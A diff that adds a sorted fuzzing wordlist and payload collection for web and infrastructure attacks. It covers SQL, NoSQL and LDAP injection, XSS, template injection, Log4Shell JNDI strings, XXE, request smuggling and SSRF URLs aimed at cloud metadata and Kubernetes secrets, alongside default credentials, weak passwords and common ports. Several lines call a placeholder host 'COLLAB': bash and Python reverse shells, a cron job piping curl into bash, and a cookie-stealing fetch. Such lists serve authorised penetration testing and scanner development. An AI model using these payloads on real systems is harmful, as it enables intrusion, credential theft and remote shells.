@@ -1,0 +1,688 @@
+ AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+ AND 1=1-- -
+ AND 1=2-- -
+ AND 1=CAST((SELECT version()) AS int)-- -
+ AND 1=CONVERT(int,(SELECT @@version))-- -
+ AND SLEEP(5)-- -
+ AND benchmark(5000000,MD5(1))-- -
+ AND extractvalue(1,concat(0x7e,version()))-- -
+ AND pg_sleep(5)-- -
+ AND updatexml(1,concat(0x7e,version()),1)-- -
+ OR ""=
+ OR ''=
+ OR '1'='1
+ OR '1'='1'#
+ OR '1'='1'-- -
+ OR 1=1 LIMIT 1#
+ OR 1=1 LIMIT 1-- -
+ OR 1=1#
+ OR 1=1-- -
+ ORDER BY 1-- -
+ ORDER BY 10-- -
+ UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+ UNION SELECT LOAD_FILE(0x5c5c5c5c5c43f414e545348454c4c43f5c746578742e747874)-- -
+ UNION SELECT NULL,NULL,NULL,NULL-- -
+ UNION SELECT NULL,NULL,NULL-- -
+ UNION SELECT NULL,NULL-- -
+ UNION SELECT NULL-- -
+ UNION SELECT user(),version()-- -
+ onfocus=alert(1) autofocus=
+ onmouseover=alert(1) x=
+#
+#set($x=7*7)$x
+${${lower:j}ndi:ldap://COLLAB/a}
+${7*7}
+${7*7}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${jndi:ldap://COLLAB/a}
+${jndi:ldap://COLLAB:1389/a}
+${{7*7}}
+${{T(java.lang.Runtime).getRuntime().exec('id')}}
+%27
+%27%20OR%201%3D1--
+) OR ('1'='1
+)(cn=*))(|(cn=
+)) OR (('1'='1
+*
+* * * * * root curl -s http://COLLAB/x.sh | bash
+*)(objectClass=*
+*)(uid=*))(|(uid=*
+-- -
+-alert(1)-
+.env
+.env.local
+.env.production
+.git/HEAD
+.git/config
+.svn/entries
+.well-known/acme-challenge
+.well-known/jwks.json
+.well-known/openid-configuration
+.well-known/security.txt
+/api/v1/orders/../../admin/users
+/sdcard/Android/data/com.example.app/files/token
+/tmp/.x.so
+000000
+1
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1' OR '1'='1
+1' OR '1'='1'-- -
+10000
+102
+10250
+1080
+1099
+110
+111
+111111
+11211
+113
+119
+123
+123123
+1234
+12345
+123456
+1234567
+12345678
+123456789
+13
+135
+137
+138
+139
+143
+1433
+1434
+1521
+15672
+161
+1723
+179
+1883
+2
+20
+2049
+21
+2181
+22
+23
+2375
+2376
+25
+27017
+27018
+28017
+3000
+3128
+3268
+3306
+3389
+3690
+37
+389
+4000
+443
+4443
+4444
+445
+465
+5000
+50000
+5060
+512
+513
+514
+515
+53
+543
+5432
+544
+548
+554
+5601
+5672
+587
+5900
+5984
+5985
+631
+636
+6379
+6443
+646
+654321
+69
+7
+7001
+7070
+7443
+79
+80
+8000
+8008
+8009
+8080
+8081
+8088
+81
+8443
+873
+88
+8888
+9
+9000
+9001
+9090
+9200
+9300
+990
+993
+995
+; EXEC xp_cmdshell('whoami')-- -
+; SELECT 'x' INTO OUTFILE '/var/www/html/x.txt'-- -
+; SELECT 1-- -
+; SELECT LOAD_FILE(CONCAT('\\\\','C:\\\\x.txt'))-- -
+; WAITFOR DELAY '0:0:5'-- -
+;alert(1);//
+<!DOCTYPE r [<!ENTITY % d SYSTEM "http://COLLAB/evil.dtd">%d;]><r/>
+<!DOCTYPE r [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]><r>&b;</r>
+<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
+<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>
+<%25=7*7%25>
+<%= 7*7 %>
+</script><img src=x onerror=alert(1)>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<SCRIPT>alert(1)</SCRIPT>
+<body onload=alert(1)>
+<form action="//COLLAB"><input name=c><input type=submit>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=fetch('//COLLAB/?c='+document.cookie)>
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+><img src=x onerror=alert(1)>
+><img src=x onerror=alert(document.domain)>
+><svg onload=alert(1)>
+ATS exception: NSAllowsArbitraryLoads
+Admin123
+Administrator:
+Administrator:Password123
+Apache
+Company123
+Content-Length: 6\r\nTransfer-Encoding: chunked\r\n
+Content-Type: application/xml
+Cookie: sess=' OR '1'='1
+CouchDB
+Docker
+Elasticsearch
+FileZilla
+GitLab
+Grafana
+Gunicorn
+Host: 169.254.169.254
+InfluxDB
+JBoss
+JaVaScRiPt:alert(1)
+Jenkins
+Jetty
+Kibana
+Kubernetes
+Lighttpd
+Microsoft SQL Server
+Microsoft-IIS
+MongoDB
+MySQL
+ORDER BY 10
+OpenResty
+OpenSSH
+Oracle Database
+P@ssw0rd
+Password
+Password1
+PostgreSQL
+PostgreSQL DB
+ProFTPD
+RabbitMQ
+Redis
+S3cr3t
+SECRET
+STARTTLS
+Samba
+Secret
+Summer2024
+Tomcat
+Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n
+User-Agent: ' OR '1'='1
+Vault
+WebLogic
+WebSphere
+Welcome1
+Winter2023
+X-Forwarded-For: 127.0.0.1
+Zookeeper
+\" OR \"1\"=\"1
+\");alert(1);//
+\";SELECT 1--
+abc123
+abuse
+account
+actuator
+actuator/env
+actuator/health
+actuator/heapdump
+actuator/info
+actuator/mappings
+adb backup -f backup.ab com.example.app
+admin
+admin'#
+admin'-- -
+admin)(|(password=*
+admin/login
+admin123
+admin:
+admin:1234
+admin:12345
+admin:admin
+admin:cisco
+admin:password
+administrator
+administrator1
+android:exported=true android:permission=none
+ansible
+api
+api/docs
+api/health
+api/openapi.json
+api/swagger.json
+api/v1
+api/v2
+apikeys
+app
+app-secret
+app://deeplink?url=https://evil.example
+app_secret
+artifacts
+audit
+auth
+backup
+backup.sql
+backup.tar.gz
+bash -i >& /dev/tcp/COLLAB/4444 0>&1
+bbs
+beta
+bin
+blog
+branches
+build
+builds
+cart
+cdn
+cgi-bin
+changeit
+changeme
+checkout
+cisco:cisco
+cisco:cisco123
+cloud
+cluster
+commits
+config
+config.json
+config.php
+config.yml
+confluence
+console
+contact
+create
+crossdomain.xml
+custom TrustManager accepting all certificates
+db
+dbadmin
+debug
+default
+delete
+demo
+deploy
+deployments
+dev
+dev1
+dev2
+developer
+development
+devops
+dict://127.0.0.1:11211/stats
+docker-compose.yml
+docs
+document
+documents
+download
+dragon
+dump
+email
+enable:cisco
+engineer
+env
+error
+etcd
+events
+export
+export PATH=/tmp:$PATH # in ~/.bashrc
+file
+file:///etc/passwd
+file:///proc/self/environ
+file:///var/run/secrets/kubernetes.io/serviceaccount/token
+files
+find . -exec /bin/sh -p \; -quit
+football
+forum
+ftp
+ftp:ftp
+gateway
+get
+git
+gitlab
+gopher://127.0.0.1:6379/_INFO%20ALL%20KEYS
+gopher://127.0.0.1:6379/_SET%20k%20v
+grafana
+graphiql
+graphql
+guest
+guest:guest
+gw
+gw2
+health
+healthcheck
+healthz
+host
+hostmaster
+http://0/
+http://017700000001/
+http://0x7f.0.0.1/
+http://0x7f000001/
+http://10.0.0.1/
+http://100.100.100.200/latest/meta-data/
+http://127.0.0.1.nip.io/
+http://127.0.0.1/
+http://127.0.0.1:11211/
+http://127.0.0.1:22/
+http://127.0.0.1:443/
+http://127.0.0.1:6379/
+http://127.0.0.1:80/
+http://127.1/
+http://169.254.169.254.nip.io/latest/meta-data/
+http://169.254.169.254/
+http://169.254.169.254/latest/api/token
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://172.16.0.1/
+http://192.168.0.1/
+http://2130706433/
+http://[::1]/
+http://[::]/
+http://localhost/
+http://localtest.me/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/?recursive=true
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+https://kubernetes.default.svc/api/v1/pods?fieldSelector=spec.nodeName=NODE
+https://management.azure.com/subscriptions?api-version=2022-12-01
+idp
+iloveyou
+images
+img
+import
+index.php
+info
+install
+intent://scan/#Intent;scheme=zxing;package=com.example;end
+internal
+intranet
+introspect
+invoice
+invoices
+issues
+javascript:alert(1)
+jenkins
+jenkins:jenkins
+jira
+jobs
+js
+jwt
+jwt-secret
+jwt_secret
+jwtsecret
+k8s
+kafka
+key
+keySecret
+keys
+kibana
+kube-apiserver
+ldap
+letmein
+list
+live
+log
+login
+logout
+logs
+m
+mail
+mail1
+mail2
+manager
+master
+me
+metrics
+michael
+mobile
+mongo
+monkey
+mutation
+mx
+mx1
+my-secret
+my_secret
+mysql
+mysql:mysql
+namespaces
+nginx
+noc
+nodes
+notifications
+ns
+ns1
+ns2
+ns3
+ns4
+old
+operator
+ops
+oracle
+oracle:oracle
+order
+orders
+owa
+panel
+passw0rd
+passwd
+password
+payment
+payments
+pbpaste:// clipboard content read by app
+permissions
+phpmyadmin
+pi:raspberry
+pipelines
+playground
+portal
+postgres
+postgres:postgres
+postmaster
+preprod
+princess
+private
+privatekey
+prod
+product
+production
+products
+profile
+projects
+prometheus
+public
+pulls
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("COLLAB",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+qa
+qazwsx
+query
+query($u:String!){ user(url:$u){ id } }
+qwerty
+qwerty123
+qwertyuiop
+rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcA==
+readme.md
+ready
+redis
+refresh
+register
+remote
+report
+reports
+repos
+robots.txt
+roles
+root
+root123
+root:
+root:root
+root:toor
+runners
+s3cr3t
+sa:
+sales
+schema
+search
+secret
+secrets
+secure
+security
+server
+server-status
+service
+sessions
+settings
+shadow
+shhhhh
+shhhhhhhhhhhhhhhhhh
+shop
+signing-key
+signingkey
+sitemap.xml
+smb
+smtp
+solo
+sql
+src
+ssh-2.0
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOLLAB attacker@lab
+sso
+stage
+staging
+starwars
+static
+stats
+status
+store
+subscription
+subscriptions
+sunshine
+superman
+supersecret
+support
+svc
+svn
+swagger
+swagger-ui.html
+swagger.json
+teams
+temp
+terraform
+test
+test1
+testing
+tmp
+token
+tokenSecret
+tokens
+tomcat
+tomcat:tomcat
+trustno1
+uWSGI
+uat
+ubuntu:ubuntu
+update
+upload
+uploads
+user
+user ALL=(ALL) NOPASSWD: /usr/bin/find
+user:user
+users
+v1
+v2
+v3
+vendor
+version
+vpn
+vpn2
+vsftpd
+web
+web.config
+webhooks
+webmail
+webmaster
+whatever
+wp-admin
+wp-config.php
+wp-content
+wp-login.php
+ww1
+ww42
+www
+www2
+www3
+your-256-bit-secret
+your-very-secure-secret
+your_256_bit_secret
+zaq12wsx
+{ "$ne": null }
+{ "username": "admin", "password": { "$gt": "" } }
+{ "username": { "$ne": null }, "password": { "$ne": null } }
+{ __schema { types { name } } }
+{ a b c d e f g h i j }
+{ a(alias:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") }
+{"$ne": null}
+{"admin":true,"role":"admin"}
+{"username":"admin","password":{"$gt":""}}
+{"username":{"$ne":null},"password":{"$ne":null}}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{#with "s" as |string|}}{{#with "e"}}{{this.[...string].constructor...}}
+{{7*'7'}}
+{{7*7}}
+{{config.items()}}
+{{config}}
+{{constructor.constructor('alert(1)')()}}
+{{request.application.__self__.__init__.__globals__['os'].popen('id').read()}}
+{{self.__init__.__globals__}}
